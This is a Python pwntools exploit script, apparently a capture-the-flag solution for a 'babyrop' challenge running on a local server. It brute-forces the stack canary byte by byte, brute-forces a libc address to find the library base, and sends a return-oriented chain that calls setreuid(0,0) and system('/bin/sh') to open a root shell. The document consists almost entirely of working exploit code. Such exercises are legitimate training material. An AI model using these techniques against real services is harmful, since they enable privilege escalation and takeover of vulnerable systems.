# idea: brute-force canary -> brute-force libc_print_version addr -> get libc base addr -> ret2libc
from pwn import *
import psutil

context.arch = 'amd64'

#parent = process("/challenge/babyrop_level15.0")

padding = b"A" * 0x38 # not including canary

def kill_children(pid):
    children = psutil.Process(pid).children()
    if len(children) != 0:
        for c in children:
            c.terminate()

# just connect to server
def connect_to_chall():
    p = remote('127.0.0.1', 1337)
    return p

# send sth to server
def send_to_chall(buf:bytes):
    p = connect_to_chall()
    p.send(buf)
    msg = p.recvall()
    p.close()
    return msg

# brute force canary
def brute_canary():
    canary = b"\x00"
    for _ in range(7): # 7 bytes left for canary
        for i in range(256):
            canary_tmp = canary + bytes([i])
            msg = send_to_chall(padding + canary_tmp)
            if b"stack smashing detected" not in msg:
                canary = canary_tmp
                break
    return canary

# brute force _start addr <- errata: should be __libc_print_version()
def brute_start(canary:bytes, rbp:bytes):
    start_addr = b"\x80" # ?180
    for i in range(16):
        start_addr_tmp = start_addr + bytes([i*16 + 1])
        p = connect_to_chall()
        p.send(padding + canary + rbp + start_addr_tmp)
        msg = b""
        while p.can_recv_raw(5):
            msg += p.recv()
        print(msg)
        if b"stable release version" in msg:
            start_addr = start_addr_tmp
            p.close()
            break
        p.close()
    # got 2 bytes, 4 bytes left to brute force
    for _ in range(4):
        for i in range(256):
            start_addr_tmp = start_addr + bytes([i])
            p = connect_to_chall()
            p.send(padding + canary + rbp + start_addr_tmp)
            #p.recvuntil(b"Leaving!\n###")
            msg = b""
            while p.can_recv_raw(5):
                msg += p.recv()
            print(msg)
            if b"stable release version" in msg:
                start_addr = start_addr_tmp
                p.close()
                break
            p.close()
    return start_addr

#canary = brute_canary()
#print(canary)
canary = b'\x00\xed\x82\xf8\x16\x9f<\xe0'
rbp = p64(0)
#start_addr = brute_start(canary, rbp) + b"\x00\x00"
#print(start_addr)
print_version_addr = b'\x80!n\xdeD\x7f\x00\x00'

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = unpack(print_version_addr, 'all') - 147840

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
ret = rop.ret.address
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
payload = padding + canary + rbp + rop.chain()

p = connect_to_chall()
p.send(payload)

p.interactive()
